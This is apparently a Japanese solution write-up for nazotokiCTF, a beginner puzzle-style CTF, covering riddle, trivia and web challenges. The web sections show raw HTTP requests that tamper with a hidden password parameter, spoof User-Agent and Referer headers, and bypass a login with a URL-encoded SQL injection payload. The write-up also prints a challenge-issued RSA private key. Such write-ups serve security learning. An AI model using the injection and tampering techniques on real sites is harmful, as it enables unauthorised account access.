# nazotokiCTF～入社試験からの脱出～
謎解き要素をミックスした初心者向けCTFイベント  
2022/7/17 (日) 13:00 JST - 2022/7/18 (祝) 13:00 JST

## Tutorial
### Welcome
フラグの説明を兼ねたチュートリアルモンダイ。

例で示された通り`ナゾトキ`で正解。

## Misc
### かに座
仲間はずれを探せ

与えられたcancer.zipを展開すると拡張子なしのファイルが13個出てくる。

bpp形式の画像であることがわかるが、ファイル名「f0525aafa095ed2665d03681537a70ea」だけテキスト形式。

テキストに直接フラグが記載されている。

`nazotokiCTF{イイワケ}`

### さそり座
犬の写真scorpio.jpgが与えられる。

フラグの形式で囲われていないため不安だったが、目に白文字で書かれている`カクダイ`がそのまま正解。

### うお座

> みずがめ座からてんびん座に向かうとき、ひみつの鍵が手に入るだろう。水の中に浮かぶ真実を見定めよ。

みずがめ座の問題サイトからてんびん座の問題サイトへの遷移を模して、HTTPリクエストヘッダにRefererをつけてみる。

```HTTP
GET / HTTP/2
Host: libra.ctf.nazotoki.tech
Cache-Control: max-age=0
Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

```

レスポンスボディに鍵情報が載っているので、必要な部分だけ保存する。

ここではファイル名`himitsu.key`とした。
```
遠いところをよくおいでくださいました。ひみつの鍵を差し上げます。

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAunVG5a8SbXgsayNWhd4f9FYsWb8z57P2Ql8Yq+fQgq0Y2xcH
/HgHO0vZrgSbjFLxnpx4D9arOtvGdn06GLZcL3eU32jPvqVh8QhqmaQ8bdUDlEp8
yt45DMoleYflw8c9q2dDsRjLUoE2qhtMm2xR8B9U+mRq+vVgEJdvNMgmn+XtsmRx
A41n3nHTfTcOznZaNRxyAqZjooDOuUoVBStJVUqbd4a3EzMCBbdAzyQ2VdQEigT0
PVstPiMI0draaO9oKlZkfuGkJJ3Ftn8+A4cjIG8ycihsGqfEMSVUpLmUI+Etb0+C
3iD+B7P25v0CDNdD2odWIRipjdE8TmuTA+AsuQIDAQABAoIBAQCBCSw5Q4EzNNk4
g8oa9m+SvhgPO90F2mrv37PJM7H+3R+4byXduIr4pDNO1G15HOWNaKdF/r+dCf88
fMk51OnTB6SFP5mVTAqNrc9n6FrRf3rsoufd1RASI8rvYfbGGBo7hkk4Q/phbH6S
FjZb0QibbnN2nQvUBP+oO8R/+IuSV3NgxvtQ3CggRnqTiwx99kHO3gEXJVHozq09
mceaWIQeT6jAf5nMsNKl2YlBxomMkeXZ8jEcCJQcAPuHJjZ2SJmLpbADIffg/c95
oaLejnoEWUflnN/QPw7shHE2F50uKyEYAh5uNCjVHRQE15jUOQZBr5aLMtpyCkfJ
3bPrzFcBAoGBAOyEMyBBwAh2Kuk+QS9OCsFcxjTQPV/jkHnk2nU8I7xrO0MqONOL
/ily+GcbTrY4bx8zkIKuYwEAp/5Mybd+C/kRsjeSGZVrNxNDNG32JYTn49Z1miKv
jNMGUJsfOoKI6G1gKnI3j5WlP2E+xXtQkJUMwqj5vdafCTVJhWrucFyxAoGBAMnR
ave7rOChNxVEoS7YmwMUSEk/PlM4MLkv7WkOPdNATxZ2u5fj8RrHfI4pGt//QXUX
pI0dE6Y8ndM24YhynvqGYr8cyygBj+BpMZFXSFmf2ozRTawFbo2IgqqsZ6AszQVb
EUuq5k5mx5Mg+ilMMzTmxjL4AD5GRy/2ofYK5DKJAoGACdhW6HjULYX9s0fMHtP4
zqO1/GzOoTcvxGMqVMb0FdvA08LmKqghJEiM3n3cgOlIdtwGn+nyZRBJ7eP0YZb1
mKCL8pQ6TGXyHPMnM4yTczzT1xF+IQN9sSsKH+rk3JomUqc2HRsC9w+x27JpNgDc
g9fMIoyCwnRMRdORoinas4ECgYAausnYFdtHxRJulrBia/3b4ovQZ7fxfbe2T0q6
Z1B48kOHTiJ6c44zZchxa7BLips4zvDUX82CbvTYTKSCVewIclQRy9Z8bfiIWGZg
QZcrh6iCjhYjenSx+iqUQFFZPZXJ583an7/xElvMeMmpPpZpo0cM6RvfI5+6EohQ
9hBTQQKBgQCBiu+qiElJXJUTrwr3XESHUEsCPz27VWViYlj/n6GsY80QSf4Y1F0d
ynDDCJ4zE0FL1WfFFGMqaE86wvQZwvv9NCqSkpxhfbYhf/lKUmyNIyqoQYkV7kAK
NjQ0gdNlw4NLioSXny6/0k5G4OIzwh8QNf38sZGKhm7FMVQ4G8r1Yw==
-----END RSA PRIVATE KEY-----
```

OpenSSLを使いコマンド実行する。
```shell
> openssl rsautl -decrypt -inkey himitsu.key -in password.enc
The command rsautl was deprecated in version 3.0. Use 'pkeyutl' instead.
The password for the zip is "fomalhaut".
```

得られたパスワード`formalhaut`でzipを解凍すると画像が得られる。

画像は立体視で文字が埋め込まれており、`ケッパク`が正解。


## Web
### ふたご座
画面にパスワードが書かれているのでその通りSubmitすると、パスワードが違いますと言われる。

HTTPリクエストを見ると、入力したものは`dummyPassword`パラメータに入っており、それと別に`realPassword`パラメータの存在に気づく。

```http
GET /check.php?dummyPassword=dioskouroi&realPassword=dummyPassword HTTP/2
Host: gemini.ctf.nazotoki.tech
Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://gemini.ctf.nazotoki.tech/
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

```

`realPassword`パラメータにも同じ値を入れてあげると、リダイレクトののち正解が返ってくる。

```
GET /check.php?dummyPassword=dioskouroi&realPassword=dioskouroi HTTP/2
Host: gemini.ctf.nazotoki.tech
Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://gemini.ctf.nazotoki.tech/
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

```

nazotokiCTF{`ナイーブ`}

### てんびん座
指定されたページにアクセスすると以下のメッセージが表示される。

> フラグは`stardustChrome`という特殊なブラウザでしか閲覧できません。

HTTPリクエストのUser-Agentを書き換えてアクセスしてみる。

```http
GET / HTTP/2
Host: libra.ctf.nazotoki.tech
Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: stardustChrome
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

```

```http
HTTP/2 200 OK
Date: Sun, 17 Jul 2022 04:31:01 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 1520
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.8
Vary: Accept-Encoding

<!DOCTYPE html>
<html lang="Ja">
  <head>
    <!-- Document Meta-->
    <meta charset="utf-8"/>
    <!-- Stylesheets-->
    <link href="assets/css/vendor.min.css" rel="stylesheet"/>
    <link href="assets/css/style.css" rel="stylesheet"/>
    <!--
    Document Title
    =============================================
    -->
    <title>Libra</title>
  </head>
  <body class="bg-gray">
  <section id="libra">
        <div class="container">
          <div class="row clearfix">
            <div class="col-12 col-md-12 offset-md-1 col-lg-8 offset-lg-1">
            <h2 class="heading--title">Libra</h2>
            <h6>リクエストヘッダー情報</h6>
            <p>
                フラグは<code>stardustChrome</code>という特殊なブラウザでしか閲覧できません。
            </p>
            <p>
                X-Forwarded-For:113.150.97.62<br>X-Forwarded-Proto:https<br>X-Forwarded-Port:443<br>Host:libra.ctf.nazotoki.tech<br>X-Amzn-Trace-Id:Root=1-62d39085-3f00904712e95a0a7426701e<br>sec-ch-ua:&quot;-Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;102&quot;<br>sec-ch-ua-mobile:?0<br>sec-ch-ua-platform:&quot;Windows&quot;<br>upgrade-insecure-requests:1<br><br />確かにstardustChromeを使ってるね。フラグをどうぞ！ <br />nazotokiCTF{<code>クローン</code>} <br />
            </p>
            <a href="/" onclick="window.location.reload();">再読み込み</a>
            </div>
          </div>
        </div>
      </section>
  </body>
</html>
```

nazotokiCTF{クローン}

### みずがめ座
社員ナンバーとパスワードを入力するフォームが表示される。

適当なIDとパスワードだと当然エラーになる。

プロローグのページをよく読むと「イントロダクション」に社員ナンバー`99`の記載がある。

社員ナンバー「99」とパスワード「password」でログインに成功。

```http
POST / HTTP/2
Host: aquarius.ctf.nazotoki.tech
Content-Length: 45
Cache-Control: max-age=0
Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://aquarius.ctf.nazotoki.tech
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://aquarius.ctf.nazotoki.tech/
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

inputNumber=99&inputPassword=password&search=
```

フラグのヒントはナンバー9999に載っており、パスワードは普通には見れないらしい。

社員ナンバー「9999」と、試しにSQLインジェクションでログインできるか確認してみる。
```http
POST / HTTP/2
Host: aquarius.ctf.nazotoki.tech
Content-Length: 66
Cache-Control: max-age=0
Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://aquarius.ctf.nazotoki.tech
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://aquarius.ctf.nazotoki.tech/
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

inputNumber=9999&inputPassword=%27OR%271%27%3D%271%27%23++&search=
```

レスポンスに「nazotokiCTF{`この候補者の苗字`}」と表示される。

改めてプロローグを読むと`タカハシ`が正解であることがわかる。


## Knowledge
### おうし座
> 2021年に行われたコンピュータウイルス「emotet」のテイクダウン作成の名前を日本語で言うと？

「テントウムシ作戦」なので「`テントウ`」が正解。

### おとめ座
> Webアプリケーションのセキュリティ分野の研究・ガイドラインの作成・脆弱性診断ツールの開発・イベント開催などの  
> 活動をしているオープンソースソフトウェアコミュニティの名称の読み方をカタカナ4文字で答えよ。

「OWASP」なので「`オワスプ`」が正解。

### やぎ座
> ある数 x を数 b のべき乗bᵖとして表した場合のpのこと。logとも呼ばれるこの数を日本語で何というか？カタカナ4文字で答えよ。  

「対数」なので「`タイスウ`」が正解。


## Riddle
### おひつじ座
あなたが目指しているものの間を読め

プロローグに「セキュリティエンジニアを目指すただの一般人だ。」と書いてるので長時間こっちを気にしてたが関係なかった。

「セキュリティ業界の星に、俺はなる！！」より星に着目。

イントロダクションの画像に★が２つあり、その間を縦読みすると「`ハンドル`」。

### しし座

カタカナが散らばった画像が与えられる。

ルールのページを見ると以下のように書かれている。
- 燃えるゴミは捨ててください
- ペットボトル

「モエルゴミ」「ペットボトル」の文字をすべてを削除すると「`チーター`」が残る。

### いて座

穴埋め問題。
```text
〇〇ス〇＝ウ
〇〇ス〇＝ウ
〇〇ス　＝ウ
〇〇ス　＝ウ
```

東西南北を当てはめると答えが現れる。
```text
イースト＝トウ
ウエスト＝ザイ
サウス　＝ナン
ノース　＝ボク
```

`イースト`が正解。


## 2nd Challenge
### へびつかい座
12星座順にここまでの答えを並べると「はてな　いちおくかい　たたけ」。

```text
はんどる
てんとう
ないーぶ
いいわけ
ちーたー
おわすぷ
くろーん
かくだい
いーすと
たいすう
たかはし
けっぱく
```


これを見る前に存在に気づいてしまっていたのだが、nazotokiというクッキーがカウントアップされており、一定数を超えるとフラグが表示される作り。
```JavaScript
function hatenaClick(){
    var $count = getCookie( 'nazotoki' );
    if( $count >= 99999999 ){
	alert("nazotokiCTF{ポラリス}");
    }
    if( !$count ){
        setCookie( 'nazotoki', 1, 1 );
    }else{
        setCookie( 'nazotoki', ++$count, 1 );
    }
}
```

アクセス数が一億回を超えるとアラートが出るらしい。「`ポラリス`」で正解。

## Last Challenge
### 最終問題
> パスワードのヒントは愛の星座の中
> 流れに従い太陽と月に背いて心の示す方を読め

Last Challengeの問題にハートの列がある。

正答への本来の導き方が分からなかったが、並び変えると文章になることに気づく。
> どとーわたすーだすすはぱ
> ぱすわーどはすたーだすと

「すたーだすと」では通らなかったので「stardust」に変更するとログインに成功。

ログイン後のページに答えが載っている。
> 最終問題のフラグは nazotokiCTF{`オールト`} です。

## Congratulations!!
### Thank you

アンケートに答えるとフラグが得られる。
> nazotokiCTF{`アリガト`}


